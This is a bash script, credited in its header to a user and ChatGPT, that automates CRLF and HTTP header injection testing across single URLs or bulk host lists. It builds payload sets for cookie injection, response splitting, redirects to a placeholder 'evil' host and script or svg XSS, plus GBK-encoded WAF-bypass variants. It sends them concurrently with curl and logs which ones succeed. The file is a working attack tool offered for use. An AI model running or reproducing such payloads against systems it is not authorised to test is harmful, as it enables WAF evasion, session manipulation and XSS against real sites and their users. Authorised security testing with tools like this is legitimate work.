#!/usr/bin/env bash
# Crlfat.sh — Automated CRLF Injection Hunter
# -------------------------------------------------------------
# Author: you + ChatGPT
# Date: 2025-08-17
# Purpose: Hunt CRLF/HTTP header injection at scale with smart payloads,
#          WAF bypasses (GBK/unicode), response-splitting probes, and
#          cache/redirect/XSS chaining checks.
#
# Inspired by: "Master CRLF Injection" by coffinxp (InfoSec Write-ups)
# and extended with extra payloads, indicators, and batching utilities.
# -------------------------------------------------------------
# Requirements: bash 4+, curl, awk, sed, grep, tr, printf, base64
# Optional:     httpx (to probe/normalize URLs), jq (nicer JSON), xargs/parallel
# -------------------------------------------------------------
# Usage:
#   chmod +x Crlfat.sh
#   ./Crlfat.sh -u https://target.com
#   ./Crlfat.sh -l hosts.txt               # multi-domain (one URL or hostname per line)
#   ./Crlfat.sh -l subs.txt --discover     # expand with common paths using httpx (if present)
#   ./Crlfat.sh -u https://target.com -m path
#   ./Crlfat.sh -u https://target.com -m query
#   ./Crlfat.sh -l urls.txt -o out --concurrency 20 --timeout 15
#   GAU/Katana mode: pipe into a list of URLs, then -l that file.
#
# Ethical use only: for authorized testing, research, and remediation.
# -------------------------------------------------------------
set -euo pipefail
IFS=$'\n\t'

VERSION="1.0.0"

# -------- Defaults --------
OUT_DIR="crlfat_out"
MODE="both"         # path|query|both
TIMEOUT=15
CONCURRENCY=10
RATE_MS=0
FOLLOW_REDIRECTS=0
EXTRA_HEADER=()
PROXY=""
DISCOVER=0
RAW_SAVE=1
UA="Crlfat/"$VERSION" (+https://example.local)"
NUCLEI_TEMPLATE=""   # optional: run nuclei if provided
NUCLEI_BIN="nuclei"
HTTPX_BIN="httpx"
JQ_BIN="jq"

# -------- Helpers --------
usage(){
  cat <<USAGE
Crlfat.sh v$VERSION — Automated CRLF Injection Hunter

Options:
  -u, --url URL            Single base URL (e.g., https://site.tld)
  -l, --list FILE          List of URLs/hosts (one per line)
  -o, --out DIR            Output directory (default: $OUT_DIR)
  -m, --mode MODE          path | query | both (default: both)
  -t, --timeout SEC        curl timeout per request (default: $TIMEOUT)
      --concurrency N      parallel workers for list mode (default: $CONCURRENCY)
      --rate MS            sleep MS between requests per worker (default: 0)
      --follow             follow redirects (default: off)
  -H, --header "K: V"      extra request header (repeatable)
      --proxy URL          proxy for curl (e.g., http://127.0.0.1:8080)
      --discover           for hostnames, attempt https/http using $HTTPX_BIN and add common paths
      --no-raw             don't save raw responses
      --nuclei TEMPLATE    also run nuclei with given CRLF template
      --ua STRING          custom User-Agent
  -h, --help               show help

Examples:
  echo target.com | $HTTPX_BIN -silent | ./Crlfat.sh -l - -o out
  ./Crlfat.sh -u https://target.com -m both -H "X-Trace: test" --nuclei cRlf.yaml
USAGE
}

log(){ printf "[Crlfat] %s\n" "$*" >&2; }

rand_token(){ head -c12 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c8; }

timestamp(){ date -u +"%Y-%m-%dT%H:%M:%SZ"; }

url_join(){
  local base="$1"; local path="$2";
  # remove trailing slash from base (except scheme)
  base="${base%%#*}"; base="${base%%?*}" || true
  [[ "$base" == */ ]] && base="${base%/}"
  [[ "$path" == /* ]] && echo "$base$path" || echo "$base/$path"
}

ensure_out(){ mkdir -p "$OUT_DIR" "$OUT_DIR/raw"; : >"$OUT_DIR/findings.csv"; \
  echo "time,url,mode,payload,status,indicator,notes" >"$OUT_DIR/findings.csv"; \
  : >"$OUT_DIR/findings.ndjson"; }

save_result(){
  local url="$1" mode="$2" payload="$3" status="$4" indicator="$5" notes="$6" rawfile="$7"
  printf "%s,%s,%s,%s,%s,%s,%s\n" "$(timestamp)" "$url" "$mode" "${payload//,/; }" "$status" "${indicator//,/; }" "${notes//,/; }" >>"$OUT_DIR/findings.csv"
  if command -v "$JQ_BIN" >/dev/null 2>&1; then
    printf '{"time":"%s","url":%s,"mode":"%s","payload":%s,"status":%s,"indicator":%s,"notes":%s,"raw":%s}\n' \
      "$(timestamp)" \
      "$(printf %s "$url" | jq -R '.')" \
      "$mode" \
      "$(printf %s "$payload" | jq -R '.')" \
      "$(printf %s "$status" | jq -R '.')" \
      "$(printf %s "$indicator" | jq -R '.')" \
      "$(printf %s "$notes" | jq -R '.')" \
      "$(printf %s "$rawfile" | jq -R '.')" >>"$OUT_DIR/findings.ndjson"
  else
    printf "%s\t%s\t%s\t%s\t%s\t%s\t%s\n" "$(timestamp)" "$url" "$mode" "$payload" "$status" "$indicator" "$rawfile" >>"$OUT_DIR/findings.ndjson"
  fi
}

# -------- Payloads (with dynamic TOKEN placeholders) --------
# We build on coffinxp's list and add extra variants.

build_payloads(){
  local TOKEN="$1"; local COOKIE="crlf_${TOKEN}"; local EVIL="https://evil.${TOKEN}.test"
  PAYLOADS_PATH=(
    "%0d%0aSet-Cookie:${COOKIE}=1;"
    "%0d%0aX-Injection-Test:${TOKEN}"
    "%0d%0aLocation:%20${EVIL}"
    "%0d%0a%0d%0a<script>alert('CRLF-${TOKEN}')</script>"
    "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>CRLF-${TOKEN}</h1>"
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>console.log('split-${TOKEN}')</script>"
    # Unicode/encoded variants & tricky ones
    "/%25%30%61Set-Cookie:${COOKIE}=1"           # %0a variant
    "/%5Cr%5Cn%20Set-Cookie:${COOKIE}=1;"       # \r\n
    "/%0aSet-Cookie:${COOKIE}=1"                 # LF only
    "/%0d%0aSet-Cookie:${COOKIE}=1;"             # CRLF
    "/%0d%0aLocation:%20${EVIL}"
    "/%0d%0a%0d%0a<svg/onload=alert('d-${TOKEN}')>" 
    "/%23%0aSet-Cookie:${COOKIE}=1"             # anchor split
    "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0a%0d%0a<svg/onload=alert('${TOKEN}')>"
    "/%2e%2e%2f%0d%0aSet-Cookie:${COOKIE}=1"   # traversal + CRLF
    "/www.evil.com/%2F..%0D%0Acoffin-x:coffin-x" # header confusion sample
  )
  PAYLOADS_QUERY=(
    "?q=%0d%0aSet-Cookie:${COOKIE}=1;"
    "?next=%0d%0aLocation:%20${EVIL}"
    "?s=%0d%0a%0d%0a<script>alert('q-${TOKEN}')</script>"
    "?id=%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert('xxs-${TOKEN}')</script>"
  )
  # GBK bypass (嘍=CR, 嘊=LF, 嘼=<, 嘾=>)
  GBK_CR="%E5%98%8D"; GBK_LF="%E5%98%8A"; GBK_LT="%E5%98%BC"; GBK_GT="%E5%98%BE"
  PAYLOADS_BYPASS=(
    "/${GBK_CR}${GBK_LF}Set-Cookie:${COOKIE}=1"
    "/${GBK_CR}${GBK_LF}Location:${EVIL}"
    "/${GBK_CR}${GBK_LF}${GBK_CR}${GBK_LF}${GBK_LT}script${GBK_GT}alert('${TOKEN}')${GBK_LT}/script${GBK_GT}"
  )
}

# -------- Indicators --------
# We look for these in headers/body to decide a hit.
INDICATORS_COMMON(){
  local TOKEN="$1"; local COOKIE="crlf_${TOKEN}"; local EVIL_HOST="evil.${TOKEN}.test"
  echo "Set-Cookie: ${COOKIE}";
  echo "X-Injection-Test: ${TOKEN}";
  echo "Location: https://evil.${TOKEN}.test";
  echo "${EVIL_HOST}";
  echo "CRLF-${TOKEN}";
  echo "split-${TOKEN}";
}

# -------- Core request function --------
request_once(){
  local testurl="$1"; local rawfile="$2"; shift 2
  local CURL=(curl -i -s -k --max-time "$TIMEOUT" -A "$UA")
  [[ $FOLLOW_REDIRECTS -eq 1 ]] && CURL+=( -L )
  [[ -n "$PROXY" ]] && CURL+=( --proxy "$PROXY" )
  for h in "${EXTRA_HEADER[@]:-}"; do CURL+=( -H "$h" ); done
  # shellcheck disable=SC2128
  ${CURL[@]} "$testurl" >"$rawfile" 2>/dev/null || true
}

analyze_raw(){
  local rawfile="$1"; local TOKEN="$2"; local status indicator notes
  status=$(awk 'NR==1{print $2}' "$rawfile" 2>/dev/null)
  [[ -z "$status" ]] && status="NA"
  # Headers end at first blank line
  local headers body
  headers=$(awk '/^$/{exit} {print}' "$rawfile")
  body=$(awk 'found{print} /^$/{found=1}' "$rawfile")
  indicator=""
  while IFS= read -r sig; do
    [[ -z "$sig" ]] && continue
    if grep -aqi -- "$sig" "$rawfile"; then
      if [[ -z "$indicator" ]]; then indicator="$sig"; else indicator="$indicator | $sig"; fi
    fi
  done < <(INDICATORS_COMMON "$TOKEN")

  # Heuristics
  if echo "$headers" | grep -qiE '^set-cookie:|^location:|x-xss-protection: 0'; then
    notes="header-manip"
  fi
  if echo "$body" | grep -qiE '<script>|<svg|<h1>'; then
    notes="${notes:+$notes,}html-injection"
  fi
  echo "$status"$'\t'"${indicator:-none}"$'\t'"${notes:-}"
}

probe_url(){
  local base="$1"; local TOKEN="$2"; local mode="$3"
  local id; id=$(rand_token)
  local base_sanitized="$base"
  # If only a hostname, try to prepend scheme later in discover.

  # Build payload arrays
  build_payloads "$TOKEN"

  local payload url rawfile status indicator notes

  # Path mode
  if [[ "$mode" == "path" || "$mode" == "both" ]]; then
    for payload in "${PAYLOADS_PATH[@]}"; do
      url=$(url_join "$base_sanitized" "$payload")
      rawfile="$OUT_DIR/raw/$(printf '%s' "$id" )_path_$(printf '%s' "$TOKEN" )_$(printf '%s' "$RANDOM" ).txt"
      request_once "$url" "$rawfile"
      read -r status indicator notes < <(analyze_raw "$rawfile" "$TOKEN")
      if [[ "$indicator" != "none" ]]; then
        save_result "$url" "path" "$payload" "$status" "$indicator" "$notes" "$rawfile"
      elif [[ $RAW_SAVE -eq 1 ]]; then
        : # keep raw for review even if no hit
      fi
      [[ $RATE_MS -gt 0 ]] && usleep "$((RATE_MS*1000))"
    done
  fi

  # Query mode
  if [[ "$mode" == "query" || "$mode" == "both" ]]; then
    for payload in "${PAYLOADS_QUERY[@]}"; do
      # ensure base has no existing query
      url="${base_sanitized%%\?*}${payload}"
      rawfile="$OUT_DIR/raw/$(printf '%s' "$id" )_query_$(printf '%s' "$TOKEN" )_$(printf '%s' "$RANDOM" ).txt"
      request_once "$url" "$rawfile"
      read -r status indicator notes < <(analyze_raw "$rawfile" "$TOKEN")
      if [[ "$indicator" != "none" ]]; then
        save_result "$url" "query" "$payload" "$status" "$indicator" "$notes" "$rawfile"
      fi
      [[ $RATE_MS -gt 0 ]] && usleep "$((RATE_MS*1000))"
    done
  fi

  # Bypass pack (always)
  for payload in "${PAYLOADS_BYPASS[@]}"; do
    url=$(url_join "$base_sanitized" "$payload")
    rawfile="$OUT_DIR/raw/$(printf '%s' "$id" )_bypass_$(printf '%s' "$TOKEN" )_$(printf '%s' "$RANDOM" ).txt"
    request_once "$url" "$rawfile"
    read -r status indicator notes < <(analyze_raw "$rawfile" "$TOKEN")
    if [[ "$indicator" != "none" ]]; then
      save_result "$url" "bypass" "$payload" "$status" "$indicator" "$notes" "$rawfile"
    fi
    [[ $RATE_MS -gt 0 ]] && usleep "$((RATE_MS*1000))"
  done
}

run_single(){
  local URL="$1"
  ensure_out
  local TOKEN; TOKEN=$(rand_token)
  log "Scanning (single): $URL"
  probe_url "$URL" "$TOKEN" "$MODE"
  log "Done. See $OUT_DIR/findings.csv and raw/"
  if [[ -n "$NUCLEI_TEMPLATE" && -x "$(command -v "$NUCLEI_BIN" || true)" ]]; then
    log "Running nuclei template as a secondary check..."
    "$NUCLEI_BIN" -u "$URL" -t "$NUCLEI_TEMPLATE" -o "$OUT_DIR/nuclei.out" || true
  fi
}

normalize_targets(){
  # If --discover and the line is a bare domain, use httpx to probe scheme/ports.
  local infile="$1"; local tmp="$OUT_DIR/.targets"
  >"$tmp"
  while IFS= read -r line || [[ -n "$line" ]]; do
    [[ -z "$line" ]] && continue
    if [[ $DISCOVER -eq 1 && -x "$(command -v "$HTTPX_BIN" || true)" ]]; then
      printf "%s\n" "$line" | "$HTTPX_BIN" -silent -ports 80,443,8080,8000,3000 || printf "%s\n" "$line"
    else
      printf "%s\n" "$line"
    fi >>"$tmp"
  done <"$infile"
  echo "$tmp"
}

run_list(){
  local LISTFILE="$1"
  ensure_out
  local targets; targets=$(normalize_targets "$LISTFILE")
  log "Scanning list with $CONCURRENCY workers..."
  local TOKEN; TOKEN=$(rand_token)
  export OUT_DIR MODE TIMEOUT FOLLOW_REDIRECTS PROXY RATE_MS RAW_SAVE UA NUCLEI_TEMPLATE NUCLEI_BIN HTTPX_BIN JQ_BIN
  export -f request_once analyze_raw url_join build_payloads INDICATORS_COMMON probe_url save_result rand_token timestamp
  cat "$targets" | sed '/^\s*$/d' | \
    xargs -I{} -P "$CONCURRENCY" bash -c 'probe_url "$@"' _ {} "$TOKEN" "$MODE"
  log "Done. See $OUT_DIR/findings.csv and raw/"
}

# -------- Arg parsing --------
URL=""; LISTFILE=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    -u|--url) URL="$2"; shift 2;;
    -l|--list) LISTFILE="$2"; shift 2;;
    -o|--out) OUT_DIR="$2"; shift 2;;
    -m|--mode) MODE="$2"; shift 2;;
    -t|--timeout) TIMEOUT="$2"; shift 2;;
    --concurrency) CONCURRENCY="$2"; shift 2;;
    --rate) RATE_MS="$2"; shift 2;;
    --follow) FOLLOW_REDIRECTS=1; shift;;
    -H|--header) EXTRA_HEADER+=("$2"); shift 2;;
    --proxy) PROXY="$2"; shift 2;;
    --discover) DISCOVER=1; shift;;
    --no-raw) RAW_SAVE=0; shift;;
    --nuclei) NUCLEI_TEMPLATE="$2"; shift 2;;
    --ua) UA="$2"; shift 2;;
    -h|--help) usage; exit 0;;
    --version) echo "$VERSION"; exit 0;;
    -) LISTFILE="/dev/stdin"; shift;;
    *) log "Unknown arg: $1"; usage; exit 1;;
  esac
done

[[ -z "$URL" && -z "$LISTFILE" ]] && { usage; exit 1; }

# -------- Run --------
if [[ -n "$URL" ]]; then
  run_single "$URL"
else
  run_list "$LISTFILE"
fi

# -------------------------------------------------------------
# Notes & Tips
# - Pair with GAU/katana/urlfinder to expand URL space, then feed into -l.
# - Use --discover to upgrade bare hosts to valid schemes via httpx.
# - Findings are in CSV and NDJSON; review raw/ for manual PoCs.
# - Tune --rate and --concurrency to be gentle with targets.
# - Add your own payloads by extending build_payloads().
# -------------------------------------------------------------
